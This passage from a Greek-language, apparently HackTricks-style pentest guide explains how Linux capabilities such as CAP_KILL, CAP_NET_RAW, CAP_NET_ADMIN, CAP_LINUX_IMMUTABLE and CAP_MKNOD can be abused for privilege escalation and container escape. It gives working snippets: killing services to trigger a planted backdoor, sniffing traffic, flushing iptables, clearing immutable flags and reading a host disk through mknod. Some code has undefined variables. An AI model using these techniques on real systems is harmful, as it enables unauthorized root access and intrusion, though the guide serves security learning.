getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Οι δυνατότητες που επιτρέπονται για το αρχείο περιορίζονται από το capability bounding set του process, ενώ το effective bit του αρχείου καθορίζει αν το permitted set του αρχείου θα προστεθεί στο effective set του process. Αυτός είναι ο λόγος για τον οποίο η προσθήκη capabilities σε ένα αρχείο δεν καθιστά αυτόματα κάθε ζητούμενη capability usable κατά την εκτέλεση.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

Το [**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει αρκετές ευαίσθητες λειτουργίες, όπως πρόσβαση στα `/dev/mem`, `/dev/kmem` ή `/proc/kcore`, τροποποίηση του `mmap_min_addr`, πρόσβαση στα system calls `ioperm(2)` και `iopl(2)`, καθώς και διάφορες disk commands. Το `FIBMAP ioctl(2)` ενεργοποιείται επίσης μέσω αυτής της capability, γεγονός που έχει προκαλέσει προβλήματα στο [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Σύμφωνα με τη man page, αυτό επιτρέπει επίσης στον κάτοχο να εκτελεί μια σειρά από device-specific λειτουργίες σε άλλες συσκευές.<sup>[[14]](#references)</sup>

Αυτό μπορεί να είναι χρήσιμο για **privilege escalation** και **Docker breakout**.<sup>[[14]](#references)</sup>

## CAP_KILL

**Αυτή η capability παρακάμπτει τους permission checks για την αποστολή signals σε processes, στις περιπτώσεις που ορίζονται από τον kernel**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **`python`** binary έχει αυτή την capability. Αν μπορούσατε **επίσης να τροποποιήσετε κάποιο service ή socket configuration** αρχείο (ή οποιοδήποτε configuration file σχετίζεται με ένα service), θα μπορούσατε να τοποθετήσετε ένα backdoor και στη συνέχεια να κάνετε kill το process που σχετίζεται με αυτό το service, περιμένοντας να εκτελεστεί το νέο configuration file με το backdoor σας.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Αν διαθέτετε capabilities για το kill και υπάρχει ένα **node program running as root** (ή ως διαφορετικός χρήστης), πιθανότατα μπορείτε να του **στείλετε** το **signal SIGUSR1** και να το κάνετε να **ανοίξει τον node debugger**, ώστε να μπορέσετε να συνδεθείτε.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Αυτή η capability επιτρέπει τη σύνδεση σε Internet ports κάτω από το 1024.** Δεν παρέχει άμεσα ευρύτερη privilege escalation.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν το **`python`** διαθέτει αυτή την capability, θα μπορεί να ακούει σε οποιοδήποτε port και ακόμη και να συνδέεται από αυτό σε οποιοδήποτε άλλο port (ορισμένες services απαιτούν συνδέσεις από ports με συγκεκριμένα privileges)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

Το [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει σε processes να **δημιουργούν RAW και PACKET sockets**, επιτρέποντάς τους να δημιουργούν και να στέλνουν αυθαίρετα network packets. Αυτό μπορεί να οδηγήσει σε κινδύνους ασφαλείας σε containerized environments, όπως packet spoofing, traffic injection και παράκαμψη των network access controls. Κακόβουλοι actors θα μπορούσαν να το εκμεταλλευτούν για να παρεμβαίνουν στο container routing ή να θέσουν σε κίνδυνο την ασφάλεια του host network, ιδιαίτερα χωρίς επαρκείς firewall protections. Επιπλέον, το **CAP_NET_RAW** υποστηρίζει λειτουργίες όπως το ping μέσω RAW ICMP requests.<sup>[[14]](#references)</sup>

**Αυτό μπορεί να επιτρέψει packet capture με κατάλληλο socket interface.** Δεν παρέχει άμεσα ευρύτερο privilege escalation.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Εάν το binary **`tcpdump`** διαθέτει αυτήν τη capability, θα μπορείτε να το χρησιμοποιήσετε για να κάνετε capture network information.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Αν το **περιβάλλον** εκχωρεί αυτή τη δυνατότητα, το **`tcpdump`** μπορεί επίσης να τη χρησιμοποιήσει για την παρακολούθηση της κίνησης.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary 2**

Το ακόλουθο παράδειγμα είναι κώδικας **`python2`** που μπορεί να είναι χρήσιμος για την υποκλοπή της κίνησης της διεπαφής "**lo**" (**localhost**). Ο κώδικας προέρχεται από το lab "_The Basics: CAP-NET_BIND + NET_RAW_" στο [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει στον κάτοχο τη δυνατότητα να **τροποποιεί τις ρυθμίσεις δικτύου**, συμπεριλαμβανομένων των ρυθμίσεων firewall, των routing tables, των δικαιωμάτων socket και των ρυθμίσεων των network interfaces μέσα στα εκτεθειμένα network namespaces. Επιτρέπει επίσης την ενεργοποίηση του **promiscuous mode** στα network interfaces, επιτρέποντας το packet sniffing μεταξύ namespaces.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **python binary** διαθέτει αυτές τις capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Αυτή η capability επιτρέπει την τροποποίηση flags του inode, όπως τα immutable και append-only.** Δεν παρέχει άμεσα ευρύτερη privilege escalation.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν διαπιστώσετε ότι ένα αρχείο είναι immutable και το Python έχει αυτή την capability, μπορείτε να **αφαιρέσετε το immutable attribute και να κάνετε το αρχείο τροποποιήσιμο:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Οι λειτουργίες `FS_IOC_GETFLAGS` και `FS_IOC_SETFLAGS` διαβάζουν και ενημερώνουν τα inode flags· το `FS_IMMUTABLE_FL` είναι το immutable flag που απαλείφεται από αυτό το παράδειγμα.<sup>[[27]](#references)</sup>

> [!TIP]
> Σημειώστε ότι συνήθως αυτό το immutable attribute ορίζεται και αφαιρείται με:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

Το [**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση του system call `chroot(2)`, το οποίο μπορεί δυνητικά να επιτρέψει το escape από περιβάλλοντα `chroot(2)` μέσω γνωστών vulnerabilities.<sup>[[11]](#references)[[14]](#references)</sup>

- [Πώς να κάνετε escape από διάφορες λύσεις chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: εργαλείο για chroot escape](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

Το [**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση του system call `reboot(2)` για επανεκκινήσεις συστήματος, συμπεριλαμβανομένων commands όπως το `LINUX_REBOOT_CMD_RESTART2`· επίσης ενεργοποιεί τα `kexec_load(2)` και, από το Linux 3.17 και έπειτα, το `kexec_file_load(2)` για τη φόρτωση νέων ή υπογεγραμμένων crash kernels αντίστοιχα.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

Το [**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) διαχωρίστηκε από το ευρύτερο **CAP_SYS_ADMIN** στο Linux 2.6.37, παρέχοντας συγκεκριμένα τη δυνατότητα χρήσης του call `syslog(2)`. Αυτό το capability επιτρέπει την προβολή kernel addresses μέσω του `/proc` και παρόμοιων interfaces όταν η ρύθμιση `kptr_restrict` είναι 1, η οποία ελέγχει την έκθεση των kernel addresses. Από το Linux 2.6.39, η προεπιλεγμένη τιμή του `kptr_restrict` είναι 0, που σημαίνει ότι οι kernel addresses εκτίθενται, αν και πολλές distributions την ορίζουν σε 1 (απόκρυψη addresses εκτός από το uid 0) ή σε 2 (πάντα απόκρυψη addresses) για λόγους ασφάλειας.<sup>[[14]](#references)</sup>

Επιπλέον, το **CAP_SYSLOG** επιτρέπει την πρόσβαση στο output του `dmesg` όταν το `dmesg_restrict` έχει οριστεί σε 1. Παρά αυτές τις αλλαγές, το **CAP_SYS_ADMIN** διατηρεί τη δυνατότητα εκτέλεσης λειτουργιών `syslog` λόγω ιστορικών προηγούμενων.<sup>[[14]](#references)</sup>

## CAP_MKNOD

Το [**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επεκτείνει τη λειτουργικότητα του system call `mknod` πέρα από τη δημιουργία κανονικών αρχείων, FIFOs (named pipes) ή UNIX domain sockets. Επιτρέπει συγκεκριμένα τη δημιουργία special files, τα οποία περιλαμβάνουν:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special files, δηλαδή devices όπως τα terminals.
- **S_IFBLK**: Block special files, δηλαδή devices όπως οι disks.

Αυτό το capability είναι χρήσιμο για processes που χρειάζεται να δημιουργούν device files, συμπεριλαμβανομένων character ή block devices.<sup>[[14]](#references)</sup>

Περιλαμβάνεται στο τεκμηριωμένο default capability set του Docker· επαληθεύστε την πραγματική runtime configuration αντί να θεωρείτε ότι κάθε deployment χρησιμοποιεί τα ίδια defaults ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Αυτό το capability επιτρέπει privilege escalations (μέσω full disk read) στο host, υπό τις εξής συνθήκες:<sup>[[7]](#references)</sup>

1. Να έχετε αρχική πρόσβαση στο host (Unprivileged).
2. Να έχετε αρχική πρόσβαση στο container (Privileged (EUID 0) και effective `CAP_MKNOD`).
3. Το host και το container πρέπει να μοιράζονται το ίδιο user namespace.

**Βήματα για τη δημιουργία και πρόσβαση σε Block Device σε Container:**

1. **Στο Host ως Standard User:**

- Προσδιορίστε το τρέχον user ID με `id`, π.χ. `uid=1000(standarduser)`.
- Εντοπίστε το target device, για παράδειγμα `/dev/sdb`.

2. **Μέσα στο Container ως `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Πίσω στο Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Αυτή η προσέγγιση επιτρέπει στον standard user να αποκτήσει πρόσβαση και ενδεχομένως να διαβάσει δεδομένα από το `/dev/sdb` μέσω του container, όταν η συσκευή, τα namespaces και τα permissions έχουν ρυθμιστεί όπως περιγράφεται.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Σε σύγχρονους Linux kernels με file capabilities, το **`CAP_SETPCAP`** επιτρέπει σε ένα thread να προσθέσει capabilities από το bounding set του στο inheritable set του, να αφαιρέσει capabilities από το bounding set του και να αλλάξει τα securebits του. Δεν επιτρέπει σε μια διεργασία να εκχωρεί αυθαίρετα capabilities σε άλλη διεργασία· αυτή η συμπεριφορά ισχύει μόνο για kernels παλαιότερους από την έκδοση 2.6.25, χωρίς υποστήριξη file capabilities.<sup>[[14]](#references)</sup>

Η system call `capset()` μπορεί να προσαρμόσει τα effective, permitted και inheritable sets ενός thread, αλλά το νέο permitted set δεν μπορεί να περιέχει capabilities εκτός του υπάρχοντος permitted set, ενώ οι ενημερώσεις του inheritable set εξακολουθούν να υπόκεινται σε περιορισμούς του kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Εργαστήρια privilege escalation με Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation σε Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Βασικές αρχές Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Αξιοποίηση των Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Υπερβολικά Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Κατάχρηση πρόσβασης σε mount namespaces μέσω του /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Γιατί υπάρχουν και πώς λειτουργούν](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Κατανόηση των Capabilities στο Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC για παράκαμψη του seccomp όταν επιτρέπεται το ptrace](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Πώς να ξεφύγετε από διάφορες λύσεις chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - αρχικό exploit διαφυγής από Docker με CAP_DAC_READ_SEARCH του Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Ανάλυση exploit διαφυγής από Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - σελίδα εγχειριδίου του Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Εκτέλεση containers - Τεκμηρίωση Docker](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Τεκμηρίωση Docker](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
